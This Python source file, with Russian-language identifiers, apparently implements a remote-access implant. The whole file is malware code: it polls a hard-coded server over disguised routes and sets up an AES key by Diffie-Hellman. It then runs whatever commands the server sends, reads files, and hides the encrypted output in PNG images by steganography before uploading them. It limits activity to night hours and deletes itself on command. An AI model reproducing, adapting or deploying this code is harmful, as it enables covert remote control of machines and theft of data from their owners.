from Crypto.Cipher import AES
from stegano import lsb
import uuid
import requests
import subprocess
import time
import sys
from datetime import datetime, time as dtime
import os
from diffiehellman import DiffieHellman

ЗЕЛЕНЫЙ = '\033[32m'
КРАСНЫЙ = '\033[31m'
СТАТУС = '\033[36m'
СБРОС = '\033[0m'

глобальный_ключ = None

ссылка = "http://192.168.20.9:80/"

маршруты = {
    0: ссылка + "feed.com",        # task
    1: ссылка + "upload_photo.com",# upload
    2: ссылка + "login.com",       # getkey
    3: ссылка + "auth.com"         # sendkey
}

def проверить_интервал():
    текущее_время = datetime.now().hour
    if текущее_время >= 2 and текущее_время <= 10:
        return True
    return False
    time.sleep(60)

def зашифровать(строка):
    дополнение = 16 - (len(строка) % 16)
    шифр = AES.new(глобальный_ключ, AES.MODE_CBC)
    открытый_текст = строка.encode() + (дополнение.to_bytes(1, "big") * дополнение)
    зашифр = шифр.encrypt(открытый_текст)
    return (зашифр + шифр.iv).decode("latin-1")

def расшифровать(текст):
    текст = текст.encode("latin-1")
    iv = текст[-16:]
    шифр = AES.new(глобальный_ключ, AES.MODE_CBC, iv)
    сообщение = текст[:-16]
    открытый_текст = шифр.decrypt(сообщение)
    открытый_текст = открытый_текст[:-открытый_текст[len(открытый_текст)-1]]
    return открытый_текст.decode()

def изменить_изображение(сообщение):
    путь = "./images/"
    имя_файла = "safari-bird"
    закодированное = lsb.hide(f"{путь}{имя_файла}.png", сообщение)
    закодированное.save(f"{путь}{имя_файла}-final.png")
    return f"{путь}{имя_файла}-final.png"

def выполнить(команда):
    результат = ""
    if команда == "sleep 10":
        time.sleep(10)
    else:
        список = команда.split()
        if список[0] == "destroy":
            уничтожить()
        elif список[0] == "upload":
            вывод = subprocess.run(["cat", список[1]], capture_output=True, text=True)
            результат = вывод.stdout
        else:
            вывод = subprocess.run(список, capture_output=True, text=True)
            результат = вывод.stdout
    return результат[:4000]

def отправить_вывод(изображение):
    requests.post(маршруты[1], files={"file": open(изображение, 'rb')})
    return

def уничтожить():
    расположение = os.path.abspath(__file__)
    subprocess.Popen(f"rm -rf images", shell=True)
    subprocess.Popen(f"rm -f '{расположение}'", shell=True)
    sys.exit(0)

def распределение_ключа():
    global глобальный_ключ
    ответ = requests.get(маршруты[2])
    ответ = ответ.json()
    публичный_ключ_сервера = ответ["key"].encode("latin-1")

    дх = DiffieHellman(group=14, key_bits=540)
    публичный_ключ = дх.get_public_key()
    json_объект = {"key": публичный_ключ.decode("latin-1")}
    requests.post(маршруты[3], json=json_объект)

    глобальный_ключ = дх.generate_shared_key(публичный_ключ_сервера)[:16]
    return

def инициализация():
    попытки = 0
    while попытки < 3:
        try:
            ответ = requests.get(ссылка)
            распределение_ключа()
            return
        except Exception as e:
            попытки += 1
    уничтожить()
    exit(1)

def разобрать_json(ответ):
    результат_json = ответ.json()
    команда = ""
    if результат_json["task"] == None:
        команда = "echo 0"
    else:
        команда = результат_json["task"]
    return команда

if __name__ == '__main__':
    инициализация()

    число_попыток = 1
    while True:
        if not проверить_интервал():
            continue
        try:
            ответ = requests.get(маршруты[0])
            зашифр_команда = разобрать_json(ответ)
            команда = расшифровать(зашифр_команда)
            вывод = выполнить(команда)
            if вывод != "":
                сообщение = зашифровать(вывод)
                изображение = изменить_изображение(сообщение)
                отправить_вывод(изображение)
            число_попыток = 1
        except Exception as e:
            if число_попыток > 3:
                break
            else:
                time.sleep(число_попыток * 15)
                число_попыток += 1

